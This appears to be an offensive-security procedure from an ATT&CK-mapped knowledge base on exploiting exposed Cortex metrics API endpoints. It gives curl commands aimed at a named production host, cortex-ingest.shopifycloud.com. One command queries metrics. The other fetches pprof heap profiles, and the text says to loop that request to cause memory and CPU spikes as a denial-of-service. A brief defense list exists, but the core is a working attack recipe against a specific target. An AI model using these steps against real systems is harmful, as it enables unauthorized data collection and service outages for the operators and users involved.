---
tags:
  - api-exploration
  - metrics-query
  - dos
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-api-query]]'
verified: false
platforms:
  - Web
  - Cloud
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Data from Information Repositories]]'
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:32:48.361Z'
sub_techniques: []
id: c5c910cc-0127-43c0-a4e5-02f8880ec30c
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Information Repositories]]'
  - '[[Network Denial of Service]]'
---
# Explore-Cortex-API-Endpoints

## Summary

This procedure tests and queries Cortex API endpoints to access metrics data and potentially perform denial-of-service by overwhelming the server with requests.

## Description

Cortex APIs for Prometheus-compatible queries (e.g., /api/v1/query) allow time-series data retrieval. When exposed, attackers can enumerate metrics; combined with pprof, it enables DoS. In the Shopify case, functional endpoints leaked operational metrics.

## Requirements

1. Knowledge of Cortex API docs (https://cortexmetrics.io/docs/api/)
2. HTTP client for GET/POST queries
3. Exposed API paths

## Defense

Defensive measures and detection strategies:

- Authenticate API calls
- Implement query rate limits
- Monitor for unusual query volumes or DoS patterns

## Objectives

1. Query and collect metrics data
2. Test endpoint functionality
3. Execute DoS via resource-heavy calls

## Instructions

### Step 1: Basic API Query

**Context**: Send a simple PromQL query to test access.

**Command** ([[commands/curl-api-query]]):
```bash
curl 'https://cortex-ingest.shopifycloud.com/api/v1/query?query=up'
```

> Returns JSON with server uptime metrics if successful.

### Step 2: DoS via Pprof Heap

**Context**: Repeatedly download heap profiles to consume resources.

**Command** ([[commands/curl-access-pprof-home]]):
```bash
curl https://cortex-ingest.shopifycloud.com/debug/pprof/heap
```

> Loop this command to trigger memory/CPU spikes.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Data from Information Repositories]]
- [[Network Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/curl-api-query]]
- [[commands/curl-access-pprof-home]]

## Tools Used

- [[tools/curl]]

## Tags

- [[api-exploration]]
- [[metrics-query]]
- [[dos]]
